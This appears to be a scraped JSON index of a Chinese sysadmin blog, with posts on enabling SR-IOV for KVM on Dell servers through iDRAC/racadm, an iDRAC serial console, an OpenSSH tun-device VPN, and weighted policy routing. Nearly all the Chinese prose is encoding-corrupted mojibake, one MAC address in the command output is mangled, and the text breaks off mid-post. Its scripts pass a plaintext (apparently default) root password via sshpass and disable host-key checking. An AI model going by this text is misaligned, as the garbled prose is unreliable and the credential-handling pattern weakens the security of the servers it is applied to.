Integrated Devices \u0026gt; SR-IOV Global Enable å½“ç„¶ï¼Œè¿™ä¹ˆéº»çƒ¦çš„äº‹æƒ…ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬é€šè¿‡idracè°ƒç”¨racadmæ¥åšå¥½äº†ï¼š\n1#!/bin/sh 2sshpass -p \u0026#34;xxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.ProcSettings.ProcVirtualization Enabled 3sshpass -p \u0026#34;calvin\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.IntegratedDevices.SriovGlobalEnable Enabled 4sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle æ³¨æ„ï¼ŒDell R730çš„æœºå™¨ç”¨å¾—æ˜¯Intel I350çš„ä»¥å¤ªç½‘å¡ï¼Œæ¯ä¸ªç½‘å£æœ€å¤šæ”¯æŒ8ä¸ªVFï¼Œå¦‚æœæ˜¯é«˜çº§çš„X520ç½‘å¡ï¼Œå°±æ”¯æŒ64ä¸ªVFã€‚\næŸ¥çœ‹ä¸€ä¸‹ç½‘å¡ï¼Œæœ‰ä»¥å¤ªç½‘å¡i350ä¹Ÿæœ‰å…‰å¡82599ESï¼š\n1lspci | grep net 201:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 301:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 419:00.0 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 519:00.1 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 82599ES 10Gçš„å¡ï¼Œå†çœ‹æ”¯æŒå¤šå°‘\n1cat /sys/class/net/em1/device/sriov_totalvfs 263 æ”¯æŒ64ä¸ªvfs\nCentos 6ç¼–è¾‘æ ¸å¿ƒé‡å¯ç³»ç»Ÿï¼š\n1vi /boot/grub/grub.conf 2kernelååŠ ä¸ªå‚æ•°intel_iommu=on 3 kernel /vmlinuz-2.6.32-504.el6.x86_64 ro root=UUID=16154774-dbaf-4fcb-aedb-0513cb65a0eb rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet intel_iommu=on Centos 7ç¼–è¾‘æ ¸å¿ƒé‡å¯ç³»ç»Ÿï¼š\n1kernelååŠ ä¸ªå‚æ•°ï¼Œåªè™šä¸¤ä¸ªç½‘å¡å°±å¥½ï¼Œintel_iommu=on ixgbe.max_vfs=2 2vi /etc/default/grub 3GRUB_CMDLINE_LINUX=\u0026#34;crashkernel=auto rhgb quiet intel_iommu=on ixgbe.max_vfs=2\u0026#34; 4grub2-mkconfig -o /boot/grub2/grub.cfg å…ˆlspciçœ‹çœ‹è®¾å¤‡ï¼š\n1lspci 201:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 301:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 401:00.2 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 501:00.3 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 6lspci -v 701:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 8 Subsystem: Dell Gigabit 4P I350-t rNDC 9 Flags: bus master, fast devsel, latency 0, IRQ 46 10 Memory at 91e00000 (32-bit, non-prefetchable) [size=1M] 11 Memory at 91f0c000 (32-bit, non-prefetchable) [size=16K] 12 Expansion ROM at 91f80000 [disabled] [size=512K] 13 Capabilities: [40] Power Management version 3 14 Capabilities: [50] MSI: Enable- Count=1/1 Maskable+ 64bit+ 15 Capabilities: [70] MSI-X: Enable+ Count=10 Masked- 16 Capabilities: [a0] Express Endpoint, MSI 00 17 Capabilities: [e0] Vital Product Data 18 Capabilities: [100] Advanced Error Reporting 19 Capabilities: [140] Device Serial Number ec-f4-bb-ff-ff-d9-96-43 20 Capabilities: [150] Alternative Routing-ID Interpretation (ARI) 21 Capabilities: [160] Single Root I/O Virtualization (SR-IOV) 22 Capabilities: [1a0] Transaction Processing Hints 23 Capabilities: [1c0] Latency Tolerance Reporting 24 Capabilities: [1d0] Access Control Services 25 Kernel driver in use: igb 26 Kernel modules: igb æ³¨æ„ä¸Šé¢æœ‰ä¸€è¡Œè¡¨ç¤ºæ˜¯æ”¯æŒçš„ï¼š Capabilities: [160] Single Root I/O Virtualization (SR-IOV)\nç„¶åæˆ‘ä»¬å¿…é¡»æ¿€æ´»VFsï¼Œä¸Šé¢æˆ‘ä»¬lspciæŸ¥çœ‹å››ä¸ªI350ç½‘å¡çš„usb idï¼Œem1æ˜¯01:00.0ï¼Œem2æ˜¯01:00.1ï¼Œem3æ˜¯01:00.2ï¼Œem4æ˜¯01:00.4ï¼Œæ¿€æ´»em1å’Œem2çš„VFsï¼š\n1echo 7 \u0026gt; /sys/bus/pci/devices/0000\\:01\\:00.0/sriov_numvfs 2echo 7 \u0026gt; /sys/bus/pci/devices/0000\\:01\\:00.0/sriov_numvfs è§é¬¼äº†ï¼Œæœ€å¤§æ˜¯8ä¸ªï¼Œè¿™é‡Œæœ€å¤šåªèƒ½å»º7ä¸ªã€‚lspciçœ‹çœ‹ï¼Œä»ç¬¬5è¡Œèµ·ï¼Œå¤šäº†14ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆä¸€ä¸ªç½‘å¡7ä¸ªï¼‰ï¼š\n1lspci|grep I350 201:00.0 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 301:00.1 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 401:00.2 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 501:00.3 Ethernet controller: Intel Corporation I350 Gigabit Network Connection (rev 01) 601:10.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 701:10.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 801:10.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 901:10.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1001:11.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1101:11.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1201:11.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1301:11.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1401:12.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1501:12.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1601:12.4 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1701:12.5 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1801:13.0 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) 1901:13.1 Ethernet controller: Intel Corporation I350 Ethernet Controller Virtual Function (rev 01) è¿™æ—¶ç³»ç»Ÿä¸­ä¼šå¤šå‡º14ä¸ªç½‘å¡ï¼š\n1ip link show 212: eth0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 3 link/ether ea:c0:8c:e1:e8:6d brd ff:ff:ff:ff:ff:ff 413: eth1: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 5 link/ether e6:7f:65:3a:94:cf brd ff:ff:ff:ff:ff:ff 614: eth2: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 7 link/ether a2:39:5e:a7:5c:17 brd ff:ff:ff:ff:ff:ff 815: eth3: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 9 link/ether 9a:dd:4a:14:87:48 brd ff:ff:ff:ff:ff:ff 1016: eth4: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 11 link/ether 2a:07:15:af:44:1c brd ff:ff:ff:ff:ff:ff 1217: eth5: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 13 link/ether 42:6c:7c:11:1f:40 brd ff:ff:ff:ff:ff:ff 1418: eth6: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 15 link/ether 86:5f:69:12:48:56 brd ff:ff:ff:ff:ff:ff 1619: eth7: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 17 link/ether 72:d7:d0:0a:6a:86 brd ff:ff:ff:ff:ff:ff 1820: eth8: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 19 link/ether 22:4f:16:83:40:83 brd ff:ff:ff:ff:ff:ff 2021: eth9: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 21 link/ether 1e:a1:10:50:82:cd brd ff:ff:ff:ff:ff:ff 2222: eth10: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 23 link/ether de:d7:35:6f:8a:8b brd ff:ff:ff:ff:ff:ff 2423: eth11: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 25 link/ether ceğŸ†e1:81:0e:31 brd ff:ff:ff:ff:ff:ff 2624: eth12: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 27 link/ether d6:35:8e:ed:d9:1d brd ff:ff:ff:ff:ff:ff 2825: eth13: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 1000 29 link/ether 52:c5:00:45:74:2c brd ff:ff:ff:ff:ff:ff å®šä¹‰ä¸¤ä¸ªç½‘ç»œæ± ï¼Œåªè¦æŒ‡å®šæŒ‡å®špfå³å¯ï¼Œvfä¼šåŠ¨æ€åˆ†é…ç»™è™šæœºï¼š\n1cat net01.xml 2\u0026lt;network\u0026gt; 3 \u0026lt;name\u0026gt;passthrough_em1\u0026lt;/name\u0026gt; 4 \u0026lt;forward mode=\u0026#39;hostdev\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; 5 \u0026lt;pf dev=\u0026#39;em1\u0026#39;/\u0026gt; 6 \u0026lt;/forward\u0026gt;\u0026lt;/network\u0026gt; 7\u0026lt;/network\u0026gt; 8 9cat net02.xml 10\u0026lt;network\u0026gt; 11 \u0026lt;name\u0026gt;passthrough_em2\u0026lt;/name\u0026gt; 12 \u0026lt;forward mode=\u0026#39;hostdev\u0026#39; managed=\u0026#39;yes\u0026#39;\u0026gt; 13 \u0026lt;pf dev=\u0026#39;em2\u0026#39;/\u0026gt; 14 \u0026lt;/forward\u0026gt;\u0026lt;/network\u0026gt; 15\u0026lt;/network\u0026gt; å¯åŠ¨è¿™2ä¸ªç½‘ç»œï¼š\n1virsh net-define net01.xml 2virsh net-start passthrough_em1 3virsh net-autostart passthrough_em1 4 5virsh net-define net02.xml 6virsh net-start passthrough_em2 7virsh net-autostart passthrough_em2 8 9modprobe vfio æˆ‘ä»¬ç¼–è¾‘è™šæœºçš„xmlé…ç½®æ–‡ä»¶\n1... 2 \u0026lt;interface type=\u0026#34;network\u0026#34;\u0026gt; 3 \u0026lt;source network=\u0026#34;passthrough_em1\u0026#34;/\u0026gt; 4 \u0026lt;/interface\u0026gt; 5 \u0026lt;interface type=\u0026#34;network\u0026#34;\u0026gt; 6 \u0026lt;source network=\u0026#34;passthrough_em2\u0026#34;/\u0026gt; 7 \u0026lt;/interface\u0026gt; 8... okï¼Œ å¯åŠ¨è™šæœºå³å¯ã€‚\næ³¨æ„ï¼Œem1å’Œem2çš„bondingå‚æ•°ï¼Œåœ¨å®ä½“æœºå’Œè™šæœºä¸­çš„bondingé…ç½®æ˜¯ä¸€æ ·çš„ï¼š\n1BONDING_OPTS=\u0026#34;miimon=80 mode=1 primary=eth0 updelay=30000\u0026#34; ä¸ºé¿å…é¢‘ç¹åˆ‡æ¢ï¼Œupdelayè®¾ç½®ä¸º30ç§’\nä¾‹å¤–ï¼š å®æœºå’Œè™šæœºçš„bondingæ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœå®æœºç½‘å¡eth0åäº†ï¼Œeth1æ¥ç®¡ï¼Œé‚£ä¹ˆè™šæœºä¸­åŒæ ·ä¹Ÿä¼šé£˜åˆ°eth1ã€‚è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœç½‘å¡å¤„äºbondingçŠ¶æ€ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„ç½‘å¡çš„macåœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœeth0æŒ‚äº†ï¼Œé‚£ä¹ˆbongdingçš„é©±åŠ¨ç¨‹åºä¼šå»æ”¹å˜eth1çš„macåœ°å€ï¼ŒæŠŠè€çš„eth0çš„åœ°å€èµ‹ç»™eth1ï¼Œåœ¨å®ä½“æœºä¸Šï¼Œmacéƒ½ä¸€æ ·ï¼Œæ‰€ä»¥ä¼šæ‹’ç»ï¼Œä½†æ˜¯åœ¨è™šæœºä¸Šå´ä¼šæˆåŠŸï¼Œè¿™æ ·å°±å¯¼è‡´è™šæœºå’Œå®æœºåœ¨åŒä¸€ä¸ªç½‘å¡ä¸Šæœ‰ä¸¤ä¸ªä¸åŒçš„macåœ°å€ï¼Œå‘åˆ°è™šæœºä¸Šeth1çš„åŒ…ä¼šè¢«å½“æˆmac spoofè€Œè¢«ä¸¢æ‰ã€‚\nè§£å†³æ–¹æ³•æ˜¯bondingå‚æ•°åŠ ä¸Šfailovermac=active æˆ–è€…è®¾ç½®spoofchk offï¼Œå¾—æŠŠæ‰€æœ‰è™šæ‹Ÿvféƒ½å¼„ä¸€é\n1 ip link set em1 vf 1 spoofchk off 2 ... 3 ip link set em1 vf 7 spoofchk off ","date":"2024-01-15","img":"","permalink":"https://rendoumi.com/posts/20240115-kvm_sriov/","series":null,"tags":null,"title":"Kvmæé«˜ç½‘å¡æ•ˆç‡ä½¿ç”¨SR-IOV"},{"categories":null,"content":"Linuxçš„ç¯å¢ƒäº†ï¼Œwindowsçš„ä¸è¡Œã€‚\nDellçš„idracå…¶å®æä¾›äº†è¿œç¨‹çš„sshç•Œé¢ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨idracæ¥è®¾ç½®biosä»€ä¹ˆçš„ï¼Œå½“ç„¶å¦‚æœèƒ½é€šè¿‡idracç›´æ¥ç™»å½•æœåŠ¡å™¨é‚£å°±æ›´å¥½äº†ã€‚\né¦–å…ˆæ™®åŠä»¥ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š\ntty: Video console terminal (abbreviation for â€œTeletypeâ€) ttyS: Serial console terminal pts: Virtual console terminal (pseudo-tty or pty but stands for Pseudo-Terminal Slave (PTS)) ç®€å•è¯´ï¼Œttyæ˜¯å¸¦æ˜¾ç¤ºå™¨çš„ç»ˆç«¯ï¼ŒttySæ˜¯ä¸²å£ç»ˆç«¯ï¼Œptsæ˜¯è™šæ‹Ÿç»ˆç«¯ã€‚ttyæ¥æ˜¾ç¤ºå™¨ã€é”®ç›˜ï¼ŒttySæ¥ä¸²å£ï¼Œpstå°±æ˜¯è¿œç¨‹ssh/telnetè¿‡æ¥çš„è™šæ‹Ÿç»ˆç«¯ã€‚\nç¬¬ä¸€æ­¥ï¼šä¿®æ”¹Dell Bios\ndellçš„biosä¸­å…³äºserialçš„é…ç½®å¦‚ä¸‹å›¾ï¼š æˆ‘ä»¬åªæ”¹å‰ä¸¤ä¸ªå°±å¯ä»¥äº†ï¼š\nSerial Communication: â€œOn with serial redirection via com2â€ Serial Port Address: â€œSerial Device1 = COM1, Serial Device2=COM2 External Serial Connector: â€œSerial Device1â€ Failsafe Baud Rate: â€œ115200â€ Remote Terminal Type: â€œVT100/VT220â€ Redirection After Boot: â€œEnabledâ€ è§£é‡Šä¸€ä¸‹ï¼š\nSerial Communication ç¼ºçœæ˜¯ On without Console Redirectionï¼Œæˆ‘ä»¬éœ€è¦æŠŠæ‰€æœ‰consoleçš„æ˜¾ç¤ºéƒ½è½¬å‘åˆ°com2ä¸Šï¼Œæ‰€ä»¥éœ€è¦æ”¹ã€‚ Serial Port Address ç¼ºçœæ˜¯ Serial Device 1=COM2, Serial Device 2=COM1ï¼Œå¦‚æœä¸æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸Šç‰©ç†æœºä¸Šçš„ä¸²å£å°±å¯ä»¥çœ‹åˆ°ç™»å½•ç”»é¢äº†ï¼Œè¿™æ ·ç­‰äºä¸²å£1åºŸæ‰äº†ï¼Œä¸‡ä¸€æˆ‘ä»¬è¦æŠŠç‰©ç†æœºä¸Šçš„com1å£ç»™ç•™å‡ºæ¥å¤‡ç”¨ï¼Œæ’ä¸ªä¸²å£çš„wavecom modemåšæŠ¥è­¦ç”¨ï¼Œé‚£å°±å‚»çœ¼äº†ï¼Œæ‰€ä»¥å¿…é¡»æ”¹æ‰ç•™å‡ºcom1å¤‡ç”¨ã€‚ External Serial Connector ç¼ºçœæ˜¯ Serial Device1ï¼Œä¸ç”¨æ”¹ï¼Œé‚£ä¹ˆç‰©ç†æœºä¸Šçš„comå£å°±æ˜¯com1äº†ï¼Œå¯¹åº”ttyS0ã€‚ Failsafe Baud Rate: â€œ115200â€ï¼Œä¸ç”¨æ”¹ï¼Œå°±ç”¨è¿™ä¸ªé«˜çš„å¥½äº†ã€‚ Remote Terminal Type: â€œVT100/VT220â€ï¼Œä¸ç”¨æ”¹ï¼Œé»‘ç™½çš„vt100å°±å¾ˆå¥½ Redirection After Boot: â€œEnabledâ€ï¼Œä¹Ÿä¸ç”¨æ”¹ï¼Œéœ€è¦é‡å®šå‘ã€‚ å½“ç„¶ï¼Œç”¨è„šæœ¬ä¸€æ¬¡æå®šæ›´å¥½ï¼š\n1#!/bin/sh 2sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.SerialCommSettings.SerialPortAddress \u0026#34;Serial1Com1Serial2Com2\u0026#34; 3sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.SerialCommSettings.SerialComm \u0026#34;OnConRedirCom2\u0026#34; 4sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW -e TIME_NA ç¬¬äºŒæ­¥ï¼šç¼–è¾‘linux\nç¼–è¾‘/etc/grub.conf åŠ ä¸Šä»¥ä¸‹ä¸¤è¡Œï¼Œå¹¶ä¸”æ³¨é‡Šæ‰splashimageï¼Œæ³¨æ„speedæ˜¯57600ï¼Œä¸æ˜¯115200\n1serial â€“unit=1 â€“speed=57600 2terminal â€“timeout=10 serial 3#splashimage=(hd0,0)/grub/splash.xpm.gz åœ¨kenelä¸€è¡Œæœ€ååŠ ä¸Š\n1console=tty1 console=ttyS1,115200n8r ç»™ä¸ªå®Œæˆç‰ˆæœ¬ï¼š\n1default=0 2timeout=5 3#splashimage=(hd0,0)/grub/splash.xpm.gz 4serial -unit=1 -speed=57600 5terminal -timeout=10 serial 6hiddenmenu 7title CentOS 6 (2.6.32-504.el6.x86_64) 8 root (hd0,0) 9 kernel /vmlinuz-2.6.32-504.el6.x86_64 ro root=UUID=16154774-dbaf-4fcb-aedb-0513cb65a0eb rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet intel_iommu=on console=tty1 console=ttyS1,115200n8r 10 initrd /initramfs-2.6.32-504.el6.x86_64.img ä¿®æ”¹/etc/securettyï¼ŒåŠ ä¸ŠttyS1\n1cat /etc/securetty 2 3console 4vc/1 5vc/2 6vc/3 7vc/4 8vc/5 9vc/6 10vc/7 11vc/8 12vc/9 13vc/10 14vc/11 15tty1 16tty2 17tty3 18tty4 19tty5 20tty6 21tty7 22tty8 23tty9 24tty10 25tty11 26ttyS1 ç¼–è¾‘ vi /etc/inittabï¼ŒåŠ ä¸€è¡Œ\nco:2345:respawn:/sbin/agetty ttyS1 115200 vt100-nav\n1cat /etc/inittab 2id:3:initdefault: 3co:2345:respawn:/sbin/agetty ttyS1 115200 vt100-nav ç„¶åé‡å¯æœåŠ¡å™¨ï¼Œç™»å½•idrac , console com2å°±å¯ä»¥ç›´æ¥ç™»å½•æœåŠ¡å™¨äº†ï¼š\n1ssh 10.8.1.2 2root@10.16.1.2\u0026#39;s password: 3/admin1-\u0026gt; console com2 4 5Connected to Serial Device 2. To end type: ^\\ ","date":"2024-01-15","img":"","permalink":"https://rendoumi.com/posts/20240115-idrac_monitor/","series":null,"tags":null,"title":"Idracè¿œç¨‹ç™»å½•æœåŠ¡å™¨"},{"categories":null,"content":"opensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å¾ˆç®€å•å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥vpnï¼Œåœºæ™¯å¦‚ä¸‹ï¼š\nå¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshæ— å¯†ç ç™»å½•Bæœº\nAæœºçš„IPï¼š172.16.8.106\nBæœºçš„IPï¼š172.16.8.108\nAæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.2\nBæœºæ‹¨é€švpn tunnelåtunçš„ipï¼š192.168.244.1\né¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd 1... 2PermitTunnel yes 3... Aå’ŒBå®‰è£…linuxä¸‹çš„tunctlè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡ 1yum install tunctl 2tunctl -t tun5 -u root åœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108) 1ssh-keygen 2ssh-copy-id root@172.16.8.108 åœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š 1ssh -w 5:5 root@172.168.8.108 åœ¨Aä¸Šæ‰§è¡Œ 1ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0 åœ¨Bä¸Šæ‰§è¡Œ 1ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0 è¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚ ä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5èµ·æ¥ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼š\n1ssh \\ 2 -o PermitLocalCommand=yes \\ 3 -o LocalCommand=\u0026#34;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0\u0026#34; \\ 4 -o ServerAliveInterval=60 \\ 5 -w 5:5 root@172.16.8.108 \\ 6 \u0026#39;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0; echo tun5 ready\u0026#39; å¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š\n1ssh -f -w5:5 vpn@example.com \\ 2 -o ServerAliveInterval=30 \\ 3 -o ServerAliveCountMax=5 \\ 4 -o TCPKeepAlive=yes \\ 5 -i ~/.ssh/id_rsa \u0026#34;sleep 1000000000\u0026#34; ç„¶ååœ¨Aå’ŒBä¸Šåˆ†åˆ«å•ç‹¬é…ç½®ipå³å¯ã€‚\nå†è¿›é˜¶ï¼šå‡è®¾Aè¦å»ºç«‹ç‹¬ç«‹çš„netnsç©ºé—´ï¼ŒåŠ ipåŠç½‘å…³å¦‚ä¸‹ï¼š\n1ip net add ns-vpn 2ip net exec ip addr add 100.64.42.2/24 dev tun42 3ip net exec ip link set up dev tun42 4ip net exec ip route add default via 100.64.42.1 å†åœ¨Bçš„/etc/sysctl.confæ‰“å¼€è½¬å‘\n1net.ipv4.ip_forward = 1 2sysctl -p 3iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -j SNAT --to 172.16.8.108 Aå°±å¯ä»¥é€šè¿‡Bä»£ç†å‡ºå»äº†ã€‚\n","date":"2024-01-15","img":"","permalink":"https://rendoumi.com/posts/20240115-ssh_tun_vpn/","series":null,"tags":null,"title":"ç”¨opensshçš„tunnelå»ºç«‹vpn"},{"categories":null,"content":"åœºæ™¯ï¼š\nå…¬å¸æœ‰ä¸¤æ¡çº¿è·¯ï¼Œä¸€æ¡æ˜¯é¹åšå£«çš„ï¼Œä¸€æ¡æ˜¯ç”µä¿¡çš„ã€‚ é¹åšå£«æ˜¯100å…†å…±äº«çº¿è·¯ï¼Œç”µä¿¡æ˜¯10å…†ç‹¬äº«çº¿è·¯ã€‚ é¹åšå£«å¯¹ç«¯çš„åœ°å€æ˜¯1.1.1.1ï¼Œæœ¬åœ°æœåŠ¡å™¨åœ°å€æ˜¯1.1.1.2 ç”µä¿¡å¯¹ç«¯çš„åœ°å€æ˜¯2.2.2.2ï¼Œæœ¬åœ°æœåŠ¡å™¨æ˜¯2.2.2.3 æ‰€ä»¥å¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ï¼Œå¤§éƒ¨åˆ†å…¬å¸åŒäº‹ç”¨å¾—æ˜¯100å…†çš„å…±äº«ï¼Œ10å…†çš„è¢«å®¢æœç‹¬ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨ç‡å¾ˆä½ã€‚é‚£èƒ½å¦ä¸¤è¾¹éƒ½ç”¨å‘¢ï¼Ÿ\nç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œç”¨ç­–ç•¥è·¯ç”±å°±å¯ä»¥ã€‚\nç­–ç•¥è·¯ç”±éœ€è¦ç”¨åˆ°iproute2ï¼Œæ²¡æœ‰çš„è¯å…ˆå®‰è£…ä¸€ä¸‹ã€‚\nå®šä¹‰ç­–ç•¥è·¯ç”±è¡¨\n1cd /etc/iproute2/ 2echo \u0026#34;101 pengboshi\u0026#34; \u0026gt;\u0026gt; rt_tables 3echo \u0026#34;102 dianxin\u0026#34; \u0026gt;\u0026gt; rt_tables å®šä¹‰ç­–ç•¥è·¯ç”±\n1ip route add default via 1.1.1.1 table 101 2ip route add default via 2.2.2.2 table 102 okï¼Œæµé‡åˆ†ä¸ºä¸¤ä¸ªæ–¹å‘ï¼Œè¿›æ¥çš„å’Œå‡ºå»çš„ï¼Œå…ˆå®šä¹‰ç®€å•çš„ï¼Œè¿›æ¥çš„ï¼š\n1ip rule add from 1.1.1.1 table 101 2ip rule add from 2.2.2.2 table 102 å‡ºå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œ100å…†å’Œ10å…†æŒ‰æƒé‡æ¥åˆ†ï¼Œ8ï¼š2å§\n1ip route replace default scope global \\ 2nexthop via 1.1.1.1 dev eth0 weight 8 \\ 3nexthop via 2.2.2.2 dev eth0:1 weight 2 æ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç”¨äº†ä¸€å°è·¯ç”±å™¨æ¥è¿æ¥ä¸Šé¢ä¸¤ä¸ªç½‘å…³çš„ï¼ŒæœåŠ¡å™¨å®é™…æ˜¯ä¸€ä¸ªç½‘å¡ä¸Šè¿åˆ°äº¤æ¢æœºï¼Œç„¶åå†ä¸Šè¿è·¯ç”±å™¨çš„ï¼Œå¦‚ä¸‹å›¾:\næˆ‘ä»¬æŠŠè¿™ä¸€åˆ‡å›ºå®šä¸‹æ¥ï¼Œç¼–è¾‘/etc/rc.d/rc.localå³å¯\n1# cat /etc/rc.local 2#!/bin/sh 3touch /var/lock/subsys/local 4/sbin/ip route replace default scope global nexthop via 1.1.1.1 dev eth0 weight 8 nexthop via 2.2.2.2 dev eth0:1 weight 2 ","date":"2024-01-11","img":"","permalink":"https://rendoumi.com/posts/20240111-route_policy2/","series":null,"tags":null,"title":"å¤šç½‘å…³ã€ç­–ç•¥è·¯ç”±ã€è´Ÿè½½å‡è¡¡çš„å®é™…åº”ç”¨"},{"categories":null,"content":"Iptableå¯ä»¥ç»™è¿›æ¥çš„åŒ…æ‰“ä¸Šæ 